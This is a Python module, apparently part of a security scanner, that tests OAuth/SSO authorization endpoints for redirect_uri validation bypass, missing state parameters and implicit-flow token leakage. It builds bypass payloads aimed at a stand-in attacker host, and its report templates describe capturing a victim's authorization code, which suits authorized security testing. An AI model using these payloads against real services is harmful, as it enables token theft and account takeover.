"""
OAuth / SSO security testing.

From Bug Bounty Bootcamp (Li, Ch 20 "Single-Sign-On Security Issues" + Ch 7 open
redirects). Focuses on the flaws that leak the authorization code / access token:

  1. redirect_uri validation bypass — the #1 OAuth bug. A strong server matches
     redirect_uri exactly against the registered value; a weak one uses a
     substring / prefix check that these variants defeat (external host,
     subdomain suffix, @-userinfo, path-prefixed host, backslash, open-redirect
     chain). If the authorization server 3xx-redirects the code/token toward an
     attacker-controlled host, that is confirmed code/token theft.

  2. Missing state (CSRF) — `state` protects the callback. If the server still
     issues a code when `state` is removed, the flow is CSRF-able (forced login /
     account linking).

  3. Token leakage — the implicit flow (`response_type=token`) returns the access
     token in the URL fragment, where it leaks via Referer / history / an open
     redirect. Flagged when the server honors it.

The analyzers are pure/deterministic; tools._run_oauth does the transport.
"""
from __future__ import annotations

from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

EVIL_HOST = "attacker.evil-oauth.example"       # clearly-external marker host
_REDIRECT_STATUS = (301, 302, 303, 307, 308)


def parse_authorize(url: str) -> dict:
    """Split an OAuth authorization URL and decide whether it looks like one."""
    p = urlparse(url)
    params = dict(parse_qsl(p.query, keep_blank_values=True))
    path = (p.path or "").lower()
    looks = ("client_id" in params and ("redirect_uri" in params or "response_type" in params)) \
        or any(k in path for k in ("/authorize", "/authorization", "/oauth", "/connect/authorize", "/signin"))
    endpoint = urlunparse(p._replace(query="", fragment=""))
    return {"endpoint": endpoint, "params": params, "is_oauth": looks,
            "redirect_uri": params.get("redirect_uri", ""), "state": params.get("state", "")}


def build_authorize(endpoint: str, params: dict, overrides: dict, drop: list = None) -> str:
    q = dict(params)
    for k in (drop or []):
        q.pop(k, None)
    q.update(overrides or {})
    return urlunparse(urlparse(endpoint)._replace(query=urlencode(q)))


def redirect_uri_variants(original: str, evil: str = EVIL_HOST) -> list:
    """Manipulations of the registered redirect_uri that beat weak validators."""
    orig = original or "https://client.example/callback"
    p = urlparse(orig)
    scheme = p.scheme or "https"
    host = p.netloc or "client.example"
    base = f"{scheme}://{host}"
    return [
        {"name": "external host", "kind": "host", "value": f"https://{evil}/callback"},
        {"name": "subdomain suffix", "kind": "host", "value": f"{scheme}://{host}.{evil}/callback"},
        {"name": "@-userinfo", "kind": "host", "value": f"{base}@{evil}/callback"},
        {"name": "path-prefixed host", "kind": "host", "value": f"https://{evil}/{host}/callback"},
        {"name": "backslash trick", "kind": "host", "value": f"https://{evil}\\@{host}/callback"},
        {"name": "open-redirect chain", "kind": "chain", "value": f"{base}/redirect?url=https://{evil}/"},
    ]


def analyze_redirect_response(status: int, location: str, evil: str = EVIL_HOST) -> dict | None:
    """Did the authorization server steer the response toward the attacker?

    'host' — the redirect's HOST is attacker-controlled (confirmed theft).
    'chain' — attacker host only appears in the redirect's query (needs a client
              open redirect to complete; weaker, candidate)."""
    if status not in _REDIRECT_STATUS or not location:
        return None
    loc = urlparse(location)
    host = (loc.hostname or "")
    if host == evil or host.endswith("." + evil) or host.endswith(evil):
        return {"accepted": "host", "location": location}
    if evil in location:
        return {"accepted": "chain", "location": location}
    return None


def analyze_state(status: int, location: str) -> bool:
    """True when removing `state` still yields an authorization code (no CSRF
    protection enforced by the server)."""
    if status not in _REDIRECT_STATUS or not location:
        return False
    q = location.split("?", 1)[1] if "?" in location else ""
    frag = location.split("#", 1)[1] if "#" in location else ""
    return "code=" in q or "code=" in frag or "access_token=" in frag


def analyze_token_leak(status: int, location: str) -> bool:
    """True when `response_type=token` returns an access token in the URL."""
    if status not in _REDIRECT_STATUS or not location:
        return False
    return "access_token=" in location or "#access_token" in location or "token_type=" in location


# ── finding builders ─────────────────────────────────────────────
def redirect_finding(endpoint: str, accepted: list, chain_only: bool = False) -> dict:
    techniques = ", ".join(a["name"] for a in accepted)
    sample = accepted[0]["location"]
    if chain_only:
        return {
            "title": "OAuth redirect_uri open-redirect chain (code/token theft)",
            "severity": "high", "target": endpoint,
            "description": (f"The authorization server accepted a redirect_uri that funnels through a client open "
                            f"redirect toward {EVIL_HOST} ({techniques}). If that open redirect exists, the "
                            "authorization code/token forwards to the attacker."),
            "impact": "Authorization-code/access-token theft -> account takeover of the OAuth-linked account.",
            "reproduction_steps": [f"Request the authorize endpoint with redirect_uri set to the chain value",
                                   f"Observe the server redirect to {sample}",
                                   "Confirm the client-side open redirect forwards the code to the attacker"],
            "evidence": f"Location: {sample}", "cwe": "CWE-601", "family": "oauth",
            "tags": ["oauth", "open-redirect", "sso"], "confidence": "candidate"}
    return {
        "title": "OAuth redirect_uri validation bypass (code/token theft)",
        "severity": "critical", "target": endpoint,
        "description": (f"The authorization server redirected the OAuth response to an attacker-controlled host "
                        f"({EVIL_HOST}) using: {techniques}. redirect_uri is not matched exactly against the "
                        "registered value, so an attacker can steal the authorization code or access token."),
        "impact": "Authorization-code / access-token theft -> full takeover of the victim's SSO-linked account.",
        "reproduction_steps": [f"Send an authorization request with a manipulated redirect_uri ({techniques})",
                               f"Observe the server 3xx-redirect the code/token to {EVIL_HOST}: {sample}",
                               "Host that endpoint as the attacker to capture the victim's code/token"],
        "evidence": f"Location: {sample}", "cwe": "CWE-601", "family": "oauth",
        "tags": ["oauth", "sso", "account-takeover"], "confidence": "confirmed"}


def state_finding(endpoint: str) -> dict:
    return {
        "title": "OAuth flow missing state (CSRF)", "severity": "medium", "target": endpoint,
        "description": ("The authorization server issued an authorization code even with the `state` parameter "
                        "removed. Without state, the callback is not CSRF-protected — an attacker can force a victim "
                        "to complete a flow (login CSRF / account linking)."),
        "impact": "Forced login / account linking, session fixation of the SSO session.",
        "reproduction_steps": ["Request the authorize endpoint with `state` removed",
                               "Observe an authorization code is still returned",
                               "Craft a CSRF that completes the flow in the victim's session"],
        "evidence": "code returned without state", "cwe": "CWE-352", "family": "oauth",
        "tags": ["oauth", "csrf", "sso"], "confidence": "candidate"}


def token_leak_finding(endpoint: str, location: str) -> dict:
    return {
        "title": "OAuth implicit flow exposes access token in URL", "severity": "medium", "target": endpoint,
        "description": ("The server honors `response_type=token` (implicit flow) and returns the access token in the "
                        "URL fragment. Fragment tokens leak through the Referer header, browser history, and any "
                        "open redirect on the client."),
        "impact": "Access-token disclosure -> API access as the victim.",
        "reproduction_steps": ["Request the authorize endpoint with response_type=token",
                               f"Observe the access token returned in the redirect: {location[:80]}",
                               "Prefer the authorization-code flow (with PKCE) instead"],
        "evidence": f"Location: {location[:120]}", "cwe": "CWE-200", "family": "oauth",
        "tags": ["oauth", "sso", "token-leak"], "confidence": "candidate"}
